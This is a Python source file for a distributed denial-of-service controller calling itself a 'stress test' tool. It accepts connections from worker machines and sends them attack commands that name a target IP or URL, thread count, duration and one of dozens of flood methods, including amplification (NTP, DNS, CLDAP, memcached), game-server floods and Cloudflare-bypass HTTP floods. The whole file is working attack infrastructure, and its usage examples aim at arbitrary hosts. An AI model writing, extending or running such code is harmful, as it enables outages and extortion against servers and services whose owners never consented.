#!/usr/bin/env python3
"""
AegisShield Stress Test Controller v4.0 (ULTIMATE)
====================================================
Distributed controller — manages multiple worker machines.
Workers run `worker.py --master <THIS_IP>:7777` and connect here.

Usage:
    python controller.py                # listen on 0.0.0.0:7777
    python controller.py --port 8888    # custom port

Commands (at the prompt):
    attack <IP:PORT|URL> <METHOD> <THREADS> <DURATION> [POWER%]
    stop          — stop attacks on all workers
    status        — show connected workers
    methods       — list all available methods
    exit          — shutdown controller
"""

import socket
import threading
import json
import time
import sys
import argparse
import os

workers = {}   # {name: socket}
lock = threading.Lock()

# ══════════════════════════════════════════════════════════════════
#  Method definitions — synced with start.py & worker.py
# ══════════════════════════════════════════════════════════════════

LAYER4_METHODS = {
    "UDP", "TCP", "SYN", "ICMP", "CPS", "CONNECTION",
    "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
    "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP",
    "MCBOT", "MINECRAFT",
}

LAYER7_METHODS = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "GSB", "DGB", "AVB", "APACHE", "XMLRPC", "BOT",
    "BOMB", "DOWNLOADER", "KILLER", "PPS", "EVEN", "RHEX", "STOMP",
    "NULL", "COOKIE",
}

ALL_METHODS = LAYER4_METHODS | LAYER7_METHODS

# ══════════════════════════════════════════════════════════════════
#  Colors
# ══════════════════════════════════════════════════════════════════

class C:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; CYAN = '\033[96m'; BOLD = '\033[1m'; RESET = '\033[0m'

# ══════════════════════════════════════════════════════════════════
#  Worker connection handler
# ══════════════════════════════════════════════════════════════════

def handle_worker(conn, addr):
    """Handle a connected worker."""
    name = f"{addr[0]}:{addr[1]}"
    with lock:
        workers[name] = conn
    sys.stdout.write(f"\n  {C.GREEN}✅ Worker connected: {name} (total: {len(workers)}){C.RESET}\n")
    print_prompt()

    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            try:
                msg = json.loads(data.decode())
                if msg.get("type") == "stats":
                    method = msg.get("method", "?")
                    sys.stdout.write(
                        f"\r  {C.CYAN}📊 [{name}] {method} | {msg.get('sent', 0):,} pkts | "
                        f"{msg.get('pps', 0):,.0f} pps | "
                        f"{msg.get('mbps', 0):,.1f} Mbps{C.RESET}\n"
                    )
                    print_prompt()
                elif msg.get("type") == "done":
                    sys.stdout.write(
                        f"\r  {C.GREEN}✅ [{name}] Attack finished. "
                        f"Total: {msg.get('total', 0):,} pkts in {msg.get('duration', 0):.1f}s{C.RESET}\n"
                    )
                    print_prompt()
                elif msg.get("type") == "error":
                    sys.stdout.write(
                        f"\r  {C.RED}❌ [{name}] Error: {msg.get('message')}{C.RESET}\n"
                    )
                    print_prompt()
            except json.JSONDecodeError:
                pass
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    finally:
        with lock:
            workers.pop(name, None)
        sys.stdout.write(f"\n  {C.RED}❌ Worker disconnected: {name} (total: {len(workers)}){C.RESET}\n")
        print_prompt()
        conn.close()


def broadcast(msg):
    """Send a command to all workers."""
    data = json.dumps(msg).encode() + b"\n"
    with lock:
        dead = []
        for name, conn in workers.items():
            try:
                conn.sendall(data)
            except (BrokenPipeError, OSError):
                dead.append(name)
        for d in dead:
            workers.pop(d, None)
    return len(workers)


def print_prompt():
    sys.stdout.write(f"{C.YELLOW}aegis-stress> {C.RESET}")
    sys.stdout.flush()


BANNER = f"""
{C.RED}
    ╔═══════════════════════════════════════════════════════════╗
    ║   █████  ███████  ██████  ██ ███████ ███████ ██   ██     ║
    ║  ██   ██ ██      ██       ██ ██      ██      ██   ██     ║
    ║  ███████ █████   ██   ███ ██ ███████ ███████ ███████     ║
    ║  ██   ██ ██      ██    ██ ██      ██      ██ ██   ██     ║
    ║  ██   ██ ███████  ██████  ██ ███████ ███████ ██   ██     ║
    ╚═══════════════════════════════════════════════════════════╝{C.RESET}
    {C.CYAN}AegisShield Stress Test Controller v4.0 (ULTIMATE){C.RESET}
    {C.YELLOW}✦ {len(ALL_METHODS)} Methods | L4 + L7 | Distributed{C.RESET}
"""


def print_methods():
    print(f"""
  {C.BOLD}Layer 4 ({len(LAYER4_METHODS)}):{C.RESET}
    {C.CYAN}Volumetric:{C.RESET}     UDP, TCP, SYN, ICMP, OVH-UDP
    {C.CYAN}Connection:{C.RESET}     CPS, CONNECTION
    {C.CYAN}Gaming:{C.RESET}         VSE, TS3, FIVEM, FIVEM-TOKEN, MCBOT, MINECRAFT, MCPE
    {C.CYAN}Amplification:{C.RESET}  MEM, NTP, DNS, CHAR, CLDAP, ARD, RDP

  {C.BOLD}Layer 7 ({len(LAYER7_METHODS)}):{C.RESET}
    {C.CYAN}Basic:{C.RESET}          GET, POST, HEAD, PPS, EVEN, NULL, COOKIE
    {C.CYAN}Advanced:{C.RESET}       CFB, CFBUAM, BYPASS, OVH, DYN, GSB, RHEX, STOMP, DGB, AVB
    {C.CYAN}Resource:{C.RESET}       STRESS, SLOW, APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER
""")


def main():
    parser = argparse.ArgumentParser(description="AegisShield Stress Test Controller v4.0")
    parser.add_argument("--port", type=int, default=7777, help="Listen port (default: 7777)")
    parser.add_argument("--host", default="0.0.0.0", help="Listen address (default: 0.0.0.0)")
    args = parser.parse_args()

    print(BANNER)

    # Start TCP listener
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((args.host, args.port))
    server.listen(100)

    print(f"  {C.GREEN}🎯 Controller listening on {args.host}:{args.port}{C.RESET}")
    print(f"  {C.CYAN}📋 On each worker machine, run:{C.RESET}")
    print(f"     {C.BOLD}python worker.py --master <THIS_IP>:{args.port}{C.RESET}")
    print(f"""
  {C.BOLD}Commands:{C.RESET}
    {C.GREEN}attack{C.RESET} <IP:PORT|URL> <METHOD> <THREADS> <DURATION> [POWER%]
    {C.GREEN}stop{C.RESET}      — stop attacks on all workers
    {C.GREEN}status{C.RESET}    — show connected workers
    {C.GREEN}methods{C.RESET}   — list all available attack methods
    {C.GREEN}exit{C.RESET}      — shutdown controller

  {C.BOLD}Examples:{C.RESET}
    attack 1.2.3.4:80 UDP 100 60 100
    attack 1.2.3.4:27015 VSE 50 120
    attack https://target.com GET 200 60
    attack 1.2.3.4:25565 MCBOT 30 60 50
""")

    # Accept workers in background
    def accept_loop():
        while True:
            try:
                conn, addr = server.accept()
                threading.Thread(target=handle_worker, args=(conn, addr), daemon=True).start()
            except OSError:
                break

    threading.Thread(target=accept_loop, daemon=True).start()

    # Command loop
    while True:
        print_prompt()
        try:
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {C.YELLOW}Shutting down...{C.RESET}")
            break

        if not line:
            continue

        parts = line.split()
        cmd = parts[0].upper()

        if cmd in ("EXIT", "QUIT", "Q"):
            broadcast({"cmd": "stop"})
            break

        elif cmd == "STATUS":
            with lock:
                n = len(workers)
            print(f"  {C.CYAN}Connected workers: {n}{C.RESET}")
            with lock:
                for name in workers:
                    print(f"    {C.GREEN}• {name}{C.RESET}")

        elif cmd == "METHODS":
            print_methods()

        elif cmd == "STOP":
            sent_to = broadcast({"cmd": "stop"})
            print(f"  {C.RED}🛑 Stop sent to {sent_to} workers{C.RESET}")

        elif cmd == "ATTACK":
            # attack <target> <method> <threads> <duration> [power]
            if len(parts) < 5:
                print(f"  {C.RED}Usage: attack <IP:PORT|URL> <METHOD> <THREADS> <DURATION> [POWER%]{C.RESET}")
                print(f"  {C.YELLOW}Type 'methods' to see all available methods{C.RESET}")
                continue

            target_raw = parts[1]
            method = parts[2].upper()
            threads = int(parts[3])
            duration = int(parts[4])

            power = 100
            if len(parts) >= 6:
                try:
                    power = max(1, min(100, int(parts[5])))
                except ValueError:
                    pass

            if method not in ALL_METHODS:
                print(f"  {C.RED}✖ Unknown method: {method}{C.RESET}")
                print(f"  Type 'methods' to see all available methods")
                continue

            # Parse target
            if method in LAYER4_METHODS:
                # Expect IP:PORT format
                if ":" in target_raw and not target_raw.startswith("http"):
                    host_part, port_part = target_raw.rsplit(":", 1)
                    target_host = host_part
                    target_port = int(port_part)
                else:
                    target_host = target_raw
                    target_port = 80

                # Resolve hostname
                try:
                    target_ip = socket.gethostbyname(target_host)
                except socket.gaierror:
                    print(f"  {C.RED}✖ Cannot resolve: {target_host}{C.RESET}")
                    continue

                msg = {
                    "cmd": "attack",
                    "target": target_ip,
                    "port": target_port,
                    "method": method,
                    "threads": threads,
                    "duration": duration,
                    "power": power,
                    "layer": 4,
                }
            else:
                # L7 — target is a URL
                if not target_raw.startswith("http"):
                    target_raw = "http://" + target_raw

                msg = {
                    "cmd": "attack",
                    "target": target_raw,
                    "port": 0,
                    "method": method,
                    "threads": threads,
                    "duration": duration,
                    "power": power,
                    "layer": 7,
                }

            sent_to = broadcast(msg)
            print(f"  {C.GREEN}🔥 Attack command sent to {sent_to} workers!{C.RESET}")
            print(
                f"     {C.CYAN}Target: {msg['target']}:{msg.get('port', '')} | Method: {method} | "
                f"Threads: {threads} | Duration: {duration}s | Power: {power}%{C.RESET}"
            )

        else:
            print(f"  {C.RED}Unknown command: {cmd}{C.RESET}")
            print(f"  Commands: attack, stop, status, methods, exit")

    server.close()
    print(f"  {C.YELLOW}Controller stopped.{C.RESET}")


if __name__ == "__main__":
    main()
